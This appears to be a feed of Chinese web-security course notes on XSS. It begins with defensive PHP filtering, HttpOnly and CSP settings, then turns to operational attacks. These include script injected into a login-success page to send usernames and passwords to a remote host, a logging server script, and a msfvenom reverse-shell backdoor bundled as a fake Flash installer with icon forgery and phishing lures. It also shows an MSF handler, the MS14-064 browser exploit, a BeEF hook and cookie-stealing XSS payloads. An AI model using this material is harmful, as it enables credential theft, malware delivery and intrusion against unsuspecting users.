class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;embed&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;frameset&#x27;</span>, <span class="string">&#x27;ilayer&#x27;</span>, <span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;bgsound&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;base&#x27;</span>);</span><br><span class="line">  <span class="variable">$ra2</span> = <span class="keyword">array</span>(<span class="string">&#x27;onabort&#x27;</span>, <span class="string">&#x27;onactivate&#x27;</span>, <span class="string">&#x27;onafterprint&#x27;</span>, <span class="string">&#x27;onafterupdate&#x27;</span>, <span class="string">&#x27;onbeforeactivate&#x27;</span>, <span class="string">&#x27;onbeforecopy&#x27;</span>, <span class="string">&#x27;onbeforecut&#x27;</span>, <span class="string">&#x27;onbeforedeactivate&#x27;</span>, <span class="string">&#x27;onbeforeeditfocus&#x27;</span>, <span class="string">&#x27;onbeforepaste&#x27;</span>, <span class="string">&#x27;onbeforeprint&#x27;</span>, <span class="string">&#x27;onbeforeunload&#x27;</span>, <span class="string">&#x27;onbeforeupdate&#x27;</span>, <span class="string">&#x27;onblur&#x27;</span>, <span class="string">&#x27;onbounce&#x27;</span>, <span class="string">&#x27;oncellchange&#x27;</span>, <span class="string">&#x27;onchange&#x27;</span>, <span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;oncontextmenu&#x27;</span>, <span class="string">&#x27;oncontrolselect&#x27;</span>, <span class="string">&#x27;oncopy&#x27;</span>, <span class="string">&#x27;oncut&#x27;</span>, <span class="string">&#x27;ondataavailable&#x27;</span>, <span class="string">&#x27;ondatasetchanged&#x27;</span>, <span class="string">&#x27;ondatasetcomplete&#x27;</span>, <span class="string">&#x27;ondblclick&#x27;</span>, <span class="string">&#x27;ondeactivate&#x27;</span>, <span class="string">&#x27;ondrag&#x27;</span>, <span class="string">&#x27;ondragend&#x27;</span>, <span class="string">&#x27;ondragenter&#x27;</span>, <span class="string">&#x27;ondragleave&#x27;</span>, <span class="string">&#x27;ondragover&#x27;</span>, <span class="string">&#x27;ondragstart&#x27;</span>, <span class="string">&#x27;ondrop&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>, <span class="string">&#x27;onerrorupdate&#x27;</span>, <span class="string">&#x27;onfilterchange&#x27;</span>, <span class="string">&#x27;onfinish&#x27;</span>, <span class="string">&#x27;onfocus&#x27;</span>, <span class="string">&#x27;onfocusin&#x27;</span>, <span class="string">&#x27;onfocusout&#x27;</span>, <span class="string">&#x27;onhelp&#x27;</span>, <span class="string">&#x27;onkeydown&#x27;</span>, <span class="string">&#x27;onkeypress&#x27;</span>, <span class="string">&#x27;onkeyup&#x27;</span>, <span class="string">&#x27;onlayoutcomplete&#x27;</span>, <span class="string">&#x27;onload&#x27;</span>, <span class="string">&#x27;onlosecapture&#x27;</span>, <span class="string">&#x27;onmousedown&#x27;</span>, <span class="string">&#x27;onmouseenter&#x27;</span>, <span class="string">&#x27;onmouseleave&#x27;</span>, <span class="string">&#x27;onmousemove&#x27;</span>, <span class="string">&#x27;onmouseout&#x27;</span>, <span class="string">&#x27;onmouseover&#x27;</span>, <span class="string">&#x27;onmouseup&#x27;</span>, <span class="string">&#x27;onmousewheel&#x27;</span>, <span class="string">&#x27;onmove&#x27;</span>, <span class="string">&#x27;onmoveend&#x27;</span>, <span class="string">&#x27;onmovestart&#x27;</span>, <span class="string">&#x27;onpaste&#x27;</span>, <span class="string">&#x27;onpropertychange&#x27;</span>, <span class="string">&#x27;onreadystatechange&#x27;</span>, <span class="string">&#x27;onreset&#x27;</span>, <span class="string">&#x27;onresize&#x27;</span>, <span class="string">&#x27;onresizeend&#x27;</span>, <span class="string">&#x27;onresizestart&#x27;</span>, <span class="string">&#x27;onrowenter&#x27;</span>, <span class="string">&#x27;onrowexit&#x27;</span>, <span class="string">&#x27;onrowsdelete&#x27;</span>, <span class="string">&#x27;onrowsinserted&#x27;</span>, <span class="string">&#x27;onscroll&#x27;</span>, <span class="string">&#x27;onselect&#x27;</span>, <span class="string">&#x27;onselectionchange&#x27;</span>, <span class="string">&#x27;onselectstart&#x27;</span>, <span class="string">&#x27;onstart&#x27;</span>, <span class="string">&#x27;onstop&#x27;</span>, <span class="string">&#x27;onsubmit&#x27;</span>, <span class="string">&#x27;onunload&#x27;</span>);</span><br><span class="line">  <span class="variable">$ra</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$ra1</span>, <span class="variable">$ra2</span>);</span><br><span class="line">  <span class="variable">$found</span> = <span class="literal">true</span>; <span class="comment">// keep replacing as long as the previous round replaced something</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="variable">$found</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">   <span class="variable">$val_before</span> = <span class="variable">$val</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$ra</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$pattern</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">     <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>]); <span class="variable">$j</span>++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$j</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;|(�&#123;0,8&#125;([9|10|13]);)&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern</span> .= <span class="string">&#x27;)*&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$pattern</span> .= <span class="variable">$ra</span>[<span class="variable">$i</span>][<span class="variable">$j</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="variable">$pattern</span> .= <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">     <span class="variable">$replacement</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="number">2</span>).<span class="string">&#x27;&lt;x&gt;&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>], <span class="number">2</span>); <span class="comment">// add in &lt;&gt; to nerf the tag</span></span><br><span class="line">     <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$val</span>); <span class="comment">// filter out the hex tags</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$val_before</span> == <span class="variable">$val</span>) &#123;</span><br><span class="line">      <span class="comment">// no replacements were made, so exit the loop</span></span><br><span class="line">      <span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HTTP-only-Cookie"><a href="#HTTP-only-Cookie" class="headerlink" title="HTTP-only Cookie"></a>HTTP-only Cookie</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//www.php.cn/php-ask-457831.html</span></span><br><span class="line">php.ini设置或代码引用   =&gt; 开启后无法获取cookie，要么没用要么残缺</span><br><span class="line">session.cookie_httponly =<span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// beef能破开这个获取到cookie。</span></span><br><span class="line"><span class="comment">//设置当前cookie</span></span><br><span class="line"><span class="comment">//setcookie(&#x27;mycookie&#x27;,&#x27;xiaodi&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="设置CSP-Content-Security-Policy"><a href="#设置CSP-Content-Security-Policy" class="headerlink" title="设置CSP(Content Security Policy)"></a>设置CSP(Content Security Policy)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//只允许加载本地源图片：开启后，就不能加载外链的图片了</span></span><br><span class="line">CSP安全策略：</span><br><span class="line">https:<span class="comment">//blog.csdn.net/a1766855068/article/details/89370320</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy:img-src &#x27;self&#x27; &quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="输入内容长度限制，实体转义等"><a href="#输入内容长度限制，实体转义等" class="headerlink" title="输入内容长度限制，实体转义等"></a>输入内容长度限制，实体转义等</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">尖括号转义为html可显示代码</span><br><span class="line">PHP 中的转义函数：</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">htmlspecialchars</span>()：将特殊字符转换为 HTML 实体，以防止跨站脚本攻击（XSS）。</span><br><span class="line">    <span class="title function_ invoke__">strip_tags</span>()：从字符串中删除 HTML 和 PHP 标签。</span><br><span class="line"></span><br><span class="line">JavaScript 中的转义函数：</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">encodeURIComponent</span>()：对 URI 组件进行编码，将特殊字符转换为 UTF-<span class="number">8</span> 编码的字符。</span><br><span class="line">    innerText 或 textContent 属性：在 DOM 中获取或设置元素的纯文本内容，而不会解析其中的 HTML 标签。</span><br></pre></td></tr></table></figure><p>对应的攻击手段：全局还  是局部（钻空子）</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0027-WEB攻防-18-通用漏洞之XSS跨站-权限维持&amp;钓鱼捆绑&amp;浏览器漏洞</title>
      <link href="/2023/06/29/SEC-Study-0055/"/>
      <url>/2023/06/29/SEC-Study-0055/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-后台植入Cookie-amp-表单劫持-权限维持"><a href="#XSS-后台植入Cookie-amp-表单劫持-权限维持" class="headerlink" title="XSS-后台植入Cookie&amp;表单劫持(权限维持)"></a>XSS-后台植入Cookie&amp;表单劫持(权限维持)</h1><p>权限维持，获取账密后，防止权限被杀掉后无法再次取得权限。</p><blockquote><p>取得权限不一定后台就能登录<br>后台能登录不一定是取得权限</p></blockquote><ul><li><p>条件：已取得相关web权限后</p><ul><li><p>写入代码到登录成功文件(登录成功后的文件，里面的用户名和密码都是正确的，需要将正确的代码发送出来，可以使用js自动触发发送到远程地址进行处理)，利用beef或xss平台实时监控Cookie等凭据实现权限维持</p><ul><li>实现下面成功页面账密劫持的案例的重要前提：改写/插入下面的语句到成功登录的那个文件夹的指定位置获取账密</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写完后，在成功的页面被访问时会偷偷的触发</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;script src=&quot;http://xxx:80/get.php?username=&#x27;</span>.$用户名.<span class="string">&#x27;&amp;pass=&#x27;</span>.$密码.<span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>远程可以这么写,把内容自动写入文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;newfile.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$u</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27; | &#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>若存在同源策略或防护情况下（获取cookie时是残缺的），Cookie获取失败可采用表单劫持或数据明文传输实现</p></li></ul></li></ul><h1 id="XSS-Flash钓鱼配合MSF捆绑上线"><a href="#XSS-Flash钓鱼配合MSF捆绑上线" class="headerlink" title="XSS-Flash钓鱼配合MSF捆绑上线"></a>XSS-Flash钓鱼配合MSF捆绑上线</h1><p>XSS经常配个钓鱼实现。</p><ul><li><p>条件：beef上线受控后或直接钓鱼（受害者爱看SESE）</p><ul><li><p>使用Flash的伪造项目，欺骗对方误以为这就是flash官网</p></li><li><p>把下载地址”立即下载”的敌方的网址换为后门地址</p></li><li><p>后门需要和正常的文件进行捆绑</p><ul><li>生成后门(，然后给后门加免杀)</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">                                                 <span class="comment">#我方服务器IP地址                        生成软件</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=<span class="number">6666</span> -f exe &gt; flash.exe</span><br></pre></td></tr></table></figure><ul><li>下载官方文件-保证安装正常</li></ul></li><li><p>压缩捆绑文件-解压提取运行</p><ul><li>捆绑方法：<ul><li>选中两个exe，选择rar或者zip压缩</li><li>选择”创建自解压文件”</li><li>选择”高级”，选择”自解压”选项,常规类选择解压到”C:\windows\tmp”</li><li>点击”设置”,<ul><li>解压后运行:那个正常的文件，C:\windows\tmp\flash.exe</li><li>解压前运行:后门文件”C:\windows\tmp\xxx.exe”</li></ul></li><li>最后一步，将图标进行修改：<ul><li>可以使用Restorator进行修改<ul><li>导出官方ICO，覆盖掉伪装文件原来的ICO</li></ul></li><li>可以使用py或者其它cmd的方式进行修改。</li></ul></li></ul></li></ul></li></ul></li></ul><h1 id="XSS-浏览器网马配合MSF访问上线"><a href="#XSS-浏览器网马配合MSF访问上线" class="headerlink" title="XSS-浏览器网马配合MSF访问上线"></a>XSS-浏览器网马配合MSF访问上线</h1><ul><li><p>MSF配置监听状态-（木马监听）</p><ul><li>和上面的配置一样</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">handler</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 0.0.0.0   # 代表本地的网卡</span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> 6666</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure></li><li><p>受害方</p><ul><li>攻击的目标是客户端，对方必须下载下来并且安装才能成功。<ul><li>诱使受害者访问URL-语言要适当 -(直接发给对方)<ul><li>例如：对方感兴趣的视频，需要点击视频跳出更新按钮，合情合理。</li><li>访问界面的没关系问题</li></ul></li><li>使用XSS让其自动执行脚本，跳转</li></ul></li></ul></li><li><p>MS浏览器漏洞</p><ul><li><a href="https://bbs.kanxue.com/thread-263885.htm">浏览器漏洞</a>，直接攻击浏览器，省去了安装。</li><li>访问特定地址后触发，危害性太大，网上资料不全面。</li><li>危害性较小：MS14<ul><li>Kali自带MSF平台</li><li>思路：让对方访问即可，当对方访问特定地址时，特定地址会自动上线到我方攻击机</li><li>前提：特定版本，且对方没有打补丁</li></ul></li></ul></li><li><p>条件：beef上线受控后或直接钓鱼（浏览器存在0day）</p><ul><li>配置MSF生成URL</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">browser</span>/<span class="title">ms14_064_ole_code_execution</span></span><br><span class="line"><span class="title">set</span> <span class="title">allowpowershellprompt</span> <span class="title">true</span></span><br><span class="line"><span class="title">set</span> <span class="title">target</span> 1</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure><ul><li>诱使受害者访问URL-语言要适当</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0026-WEB攻防-17-通用漏洞之XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持</title>
      <link href="/2023/06/27/SEC-Study-0054/"/>
      <url>/2023/06/27/SEC-Study-0054/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、XSS跨站-原理&amp;攻击&amp;分类等<br>2、XSS跨站-反射型&amp;存储型&amp;DOM型等<br>3、XSS跨站-攻击手法&amp;劫持&amp;盗取凭据等<br>4、XSS跨站-攻击项目&amp;XSS平台&amp;Beef-XSS</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>跨站点脚本攻击（前端漏洞，特征：输出特征）</p><p>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。<br>通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</p><ul><li>数据交互的地方<ul><li>get、post、headers</li><li>反馈与浏览</li><li>富文本编辑器</li><li>各类标签插入和自定义</li></ul></li><li>数据输出的地方<ul><li>用户资料</li><li>关键词、标签、说明</li><li>文件上传</li></ul></li></ul><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="常见的三个XSS"><a href="#常见的三个XSS" class="headerlink" title="常见的三个XSS"></a>常见的三个XSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">全依靠JS代码，权限较死。</span><br><span class="line">JS代码很隐蔽，能做的行为较少。</span><br><span class="line">获取COOKIE后，人家可以尝试上线你的设备，夺root。</span><br></pre></td></tr></table></figure><h3 id="反射型（非持久型）"><a href="#反射型（非持久型）" class="headerlink" title="反射型（非持久型）"></a>反射型（非持久型）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">▍=&gt; 漏洞属于一次性的,每次都需要自己构造好再去(自己/别人)进行请求</span><br><span class="line">正常请求 locate:<span class="number">8088</span>/xss.php?id=<span class="number">123</span> </span><br><span class="line">异常请求 locate:<span class="number">8088</span>/xss.php?id=&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;1&#x27;</span>)&lt;/script&gt;</span><br><span class="line">向人攻击：攻击站长，攻击管理员，需要别人去配和你，访问你这个有问题的地址。</span><br><span class="line">厂商会选择不接受这个漏洞，认为这个漏洞鸡肋（大部分不接受）</span><br><span class="line"></span><br><span class="line">  <span class="number">1</span>.对方是谁</span><br><span class="line">  <span class="number">2</span>.对方能访问这个网址</span><br><span class="line">  <span class="number">3</span>.发送反射型的网址给对方</span><br><span class="line">  <span class="number">4</span>.点击完成能不能触发（浏览器的自带过滤）（自身防御措施）</span><br></pre></td></tr></table></figure><h3 id="存储型（持久型）"><a href="#存储型（持久型）" class="headerlink" title="存储型（持久型）"></a>存储型（持久型）</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">▍=&gt; 攻击代码植入到数据库，只要触发地址就一定受到攻击，不需要重复构造</span><br><span class="line">◆ 留言板 - 留言永久被看到，植入攻击代码时永久被触发，危害大。</span><br><span class="line">◆ XSS平台：https://xss.pt</span><br><span class="line">    获取的cookie信息不一定是管理员的cookie，浏览器有cookie保护措施,导致某些cookie获取不全。</span><br><span class="line"></span><br><span class="line">◆ BEEf-XSS获取cookie：</span><br><span class="line">    web渗透利器，这是搭建网站：</span><br><span class="line">      https://www.cnblogs.com/ardyh/p/14781928.html</span><br><span class="line">      https://github.com/beefproject/beef</span><br><span class="line">    源于kali钓鱼的，是一个XSS利用框架。</span><br><span class="line">      写入beef-xss的办法：<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxx:3000/hack.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    伪装软件更新：adode flash</span><br><span class="line">    功能比较复杂</span><br></pre></td></tr></table></figure><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">▍=&gt; 接受数据的方式是JS，输入输出都是js代码</span><br><span class="line">代码如下：</span><br><span class="line">前端DOM树的叫法。-&gt; 挖掘dom看的是html代码</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;page-content&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xssd_main&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">EmpireCMS存在的dom漏洞：</span><br><span class="line">http://xxx/e/ViewImg/index.html?url=javascript:alert(1)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="xss-fsx.png"><br><img src="xss-ccx.png"></p><h2 id="其他XSS"><a href="#其他XSS" class="headerlink" title="其他XSS"></a>其他XSS</h2><h3 id="mXSS-突变型XSS-gt-无法示范"><a href="#mXSS-突变型XSS-gt-无法示范" class="headerlink" title="mXSS(突变型XSS) =&gt; 无法示范"></a>mXSS(突变型XSS) =&gt; 无法示范</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MXSS：https://www.fooying.com/the-art-of-xss-1-introduction/</span></span><br></pre></td></tr></table></figure><h3 id="UXSS（通用型xss）"><a href="#UXSS（通用型xss）" class="headerlink" title="UXSS（通用型xss）"></a>UXSS（通用型xss）</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#UXSS全称Universal Cross-Site Scripting =&gt; 浏览器是否有问题/攻击浏览器</span><br><span class="line">UXSS是利用浏览器或者浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型。</span><br><span class="line">MICROSOFT EDGE uXSS CVE-2021-34506</span><br><span class="line">Edge浏览器翻译功能导致JS语句被调用执行：</span><br><span class="line">  &quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  &quot;&gt;&lt;img/src/onerror=alert(document.cookie)&gt;</span><br><span class="line">漏洞演示视频：https://www.bilibili.com/video/BV1fX4y1c7rX</span><br></pre></td></tr></table></figure><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Flashxss-swf引用js的xss</span></span><br><span class="line">SWF：播放小视频的播放器，播放哪个文件就传什么参数，接受JS代码。</span><br><span class="line">无论是白盒还是黑盒审计，都是看是否有.swf文件。 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 白盒</span></span><br><span class="line">  .swf反编译：使用JPEXS Free Flash Decompiler打开.swf文件即自动反编译</span><br><span class="line">  </span><br><span class="line">  phpwind SWF反编译 Flashxss</span><br><span class="line">  SWF调用JS的函数： ExternalInterface.call 执行JS代码</span><br><span class="line">  ExternalInterface.<span class="title function_ invoke__">call</span>(this.jQuery,<span class="string">&quot;jPlayerFlashEvent&quot;</span>,JplayerEvent.JPLAYER_READY,this.<span class="title function_ invoke__">extractStatusData</span>(this.commonStatus));</span><br><span class="line">  this.jQuery:代表着变量</span><br><span class="line">  this.jQuery = loaderInfo.parameters.jQuery + <span class="string">&quot;(\&#x27;#&quot;</span> + loaderInfo.parameters.id + <span class="string">&quot;\&#x27;).jPlayer&quot;</span>;</span><br><span class="line"></span><br><span class="line">  Payload：phpwind/www/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>))&#125;<span class="keyword">catch</span>(e)&#123;&#125;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 黑盒</span></span><br><span class="line">  把目标网站的.swf下载下来</span><br><span class="line">  一堆swf的地方：https:<span class="comment">//mickeymouse24.com/games/</span></span><br></pre></td></tr></table></figure><h3 id="PDFXSS"><a href="#PDFXSS" class="headerlink" title="PDFXSS"></a>PDFXSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PDFXSS-上传后直链触发(大部分浏览器是可以直接打开PDF文件的)</span></span><br><span class="line">可以在文件上传当中利用</span><br><span class="line">  <span class="number">1</span>、创建PDF，在文件的属性处加入动作JS</span><br><span class="line">    迅捷PDF编辑器能做到这点。</span><br><span class="line">    app.<span class="title function_ invoke__">alert</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">2</span>、通过文件上传获取直链</span><br><span class="line">  <span class="number">3</span>、直链地址访问后被触发（浏览器打开）（注意，是直连地址，且访问时不是下载操作。）</span><br></pre></td></tr></table></figure><h3 id="被弃用的XSS，找不到案例的那种"><a href="#被弃用的XSS，找不到案例的那种" class="headerlink" title="被弃用的XSS，找不到案例的那种"></a>被弃用的XSS，找不到案例的那种</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">UTF-<span class="number">7</span> XSS</span><br><span class="line">MHTML XSS</span><br><span class="line">CSS XSS </span><br><span class="line">VBScript XSS</span><br></pre></td></tr></table></figure><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>核心：执行JavaScript代码,输出到前端执行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">网络钓鱼，包括获取各类用户账号；</span><br><span class="line">窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；</span><br><span class="line">劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；</span><br><span class="line">强制弹出广告页面、刷流量等；</span><br><span class="line">网页挂马；</span><br><span class="line">进行恶意操作，如任意篡改页面信息、删除文章等；</span><br><span class="line">进行大量的客户端攻击，如ddos等；</span><br><span class="line">获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</span><br><span class="line">控制受害者机器向其他网站发起攻击；</span><br><span class="line">结合其他漏洞，如csrf,实施进一步危害；</span><br><span class="line">提升用户权限，包括进一步渗透网站；</span><br><span 